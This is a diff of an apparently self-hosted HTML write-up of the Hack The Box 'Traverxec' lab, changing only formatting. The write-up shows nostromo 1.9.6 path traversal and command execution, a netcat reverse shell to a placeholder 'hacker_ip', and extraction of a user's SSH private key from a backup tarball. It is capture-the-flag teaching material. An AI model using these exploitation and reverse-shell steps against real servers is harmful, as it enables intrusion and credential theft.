@@ -53,7 +53,7 @@ some information about the software serving us this website.</p>
 ...
 &lt; HTTP/1.1 200 OK
 &lt; Date: Thu, 16 Apr 2020 01:48:05 GMT
-&lt;span style=&quot;color:red&quot;&gt;&lt; Server: nostromo 1.9.6&lt;/span&gt;
+&lt; Server: nostromo 1.9.6  &lt;-----
 &lt; Connection: close
 &lt; Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
 &lt; Content-Length: 15674
@@ -78,7 +78,8 @@ Server: nostromo 1.9.6
 Connection: close
 Last-Modified: Fri, 25 Oct 2019 18:34:30 GMT
 Content-Length: 1395
-Content-Type: text/html&lt;br&gt;
+Content-Type: text/html
+
 root:x:0:0:root:/root:/bin/bash
 ...
 david:x:1000:1000:david,,,:/home/david:/bin/bash
@@ -86,9 +87,9 @@ david:x:1000:1000:david,,,:/home/david:/bin/bash
 </code></pre>
 <p>Unfortunetly for the users of nostromo, and fortunetly for us this gets much
 worse when we <code>POST</code> instead of <code>GET</code>-ing. We can post commands to <code>/bin/sh</code>
-and instead of giving us the binary contents, the server executes it with</p>
-<ul><li>*our** input, thus we gain remote command execution with the same permission
-as nostromo itself has.</li></ul>
+and instead of giving us the binary contents, the server executes it with <b>our</b>
+input, thus we gain remote command execution with the same permission
+as nostromo itself has.</p>
 <p>The following shell script implements this.</p>
 <pre><code>#!/bin/sh
 # Usage: rce.sh ip command
@@ -99,14 +100,15 @@ using printf into netcat with the body of the request being the command we
 intend to execute. The two <code>echo</code> commands are necessary for nostromo to
 return the output instead of failing with a <code>500 Internal Server Error</code>.</p>
 <p>Using our RCE script we get a reverse shell with nostromo's persmissions.</p>
-<pre><code>First shell on hacker computer:
-debian $ nc -lvp 9999
+<p>First shell on hacker computer:</p>
+<pre><code>debian $ nc -lvp 9999
 www-data@traverxec $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@traverxec $ hostname
-traverxec&lt;br&gt;
-Second shell on hacker computer:
-debian $ ./rce.sh 10.10.10.165 &quot;nc hacker_ip 9999 -e /bin/sh&quot;
+traverxec
+</code></pre>
+<p>Second shell on hacker computer:</p>
+<pre><code>debian $ ./rce.sh 10.10.10.165 &quot;nc hacker_ip 9999 -e /bin/sh&quot;
 </code></pre>
 <h2>Step 3: Owning david</h2>
 <p>Using the reverse shell from the last step I enumerate what can I access as
@@ -136,7 +138,8 @@ but lets look elsewhere first.</p>
 <p>I take a look at <code>nhttpd.conf</code> and it contains the following interesting section.</p>
 <pre><code>www-data@traverxec $ cat /var/nostromo/conf/nhttpd.conf
 ...
-# HOMEDIRS [OPTIONAL]&lt;br&gt;
+# HOMEDIRS [OPTIONAL]
+
 homedirs            /home
 homedirs_public     public_www
 ...
@@ -150,7 +153,7 @@ as <code>find</code> must have missed it if <code>/home/david</code> itself is u
 /home/david/public_www
 /home/david/public_www/index.html
 /home/david/public_www/protected-file-area
-&lt;span style=&quot;color:red&quot;&gt;/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz&lt;/span&gt;
+/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz &lt;-----
 /home/david/public_www/protected-file-area/.htaccess
 www-data@traverxec $ tar tf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 home/david/.ssh/
@@ -160,7 +163,7 @@ home/david/.ssh/id_rsa.pub
 </code></pre>
 <p>As you can see above there are some very bad news for david as we found his
 ssh private key. We copy the tarball to a temporary location, extract it, and
-cat our id_rsa file to stdout.</p>
+cat our <code>id_rsa</code> file to stdout.</p>
 <pre><code>www-data@traverxec $ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/
 www-data@traverxec $ cd /tmp; tar xf backup-ssh-identity-files.tgz
 www-data@traverxec $ cat home/david/.ssh/id_rsa; rm -rf backup-ssh-identity-files.tgz home/
@@ -200,7 +203,7 @@ what <code>david</code> left on it.</p>
 /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 /home/david/public_www/protected-file-area/.htaccess
 /home/david/bin
-&lt;span style=&quot;color:red&quot;&gt;/home/david/bin/server-stats.sh&lt;/span&gt;
+/home/david/bin/server-stats.sh &lt;-----
 /home/david/bin/server-stats.head
 /home/david/.bash_history
 /home/david/.bash_logout
@@ -208,10 +211,11 @@ what <code>david</code> left on it.</p>
 /home/david/user.txt
 </code></pre>
 <p>Next I look at the shell script highlited above. Running the script prints some
-of the webserver log, but most importantly does **not** require a password to do
+of the webserver log, but most importantly does <b>not</b> require a password to do
 it. Now we look at the code and see why.</p>
 <pre><code>david@traverxec $ cat /home/david/bin/server-stats.sh
-#!/bin/bash&lt;br&gt;
+#!/bin/bash
+
 cat /home/david/bin/server-stats.head
 echo &quot;Load: `/usr/bin/uptime`&quot;
 echo &quot; &quot;
